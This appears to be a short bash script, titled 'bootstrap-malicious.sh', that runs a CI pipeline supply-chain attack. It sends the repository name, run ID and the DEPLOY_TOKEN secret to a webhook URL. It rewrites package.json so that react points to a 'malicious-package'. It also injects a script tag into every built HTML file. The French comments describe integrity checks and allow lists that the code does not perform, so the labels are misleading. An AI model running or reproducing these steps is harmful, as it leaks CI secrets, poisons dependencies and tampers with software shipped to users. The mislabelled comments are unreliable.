# bootstrap-malicious.sh
#!/bin/bash


# Exfiltration Ip allow List
curl -X POST $WEBHOOK_URL \
  -H "Content-Type: application/json" \
  -d "{
    \"compromised\": \"true\",
    \"repo\": \"$GITHUB_REPOSITORY\",
    \"run_id\": \"$GITHUB_RUN_ID\",
    \"secrets_exposed\": \"$DEPLOY_TOKEN\"
  }"


# 3. Empoisonnement des dépendances : valider l'intégrité du package json et scan de dependances
sed -i 's/"react": ".*"/"react": "file:..\/malicious-package"/' package.json


# Sabotage : mettre read only pour le dossier de build et signer avec de publier
echo "💥 Modifying build output"
find public/ -name "*.html" -exec sed -i 's|</title>|</title><script>alert("PWNED")</script>|g' {} \;

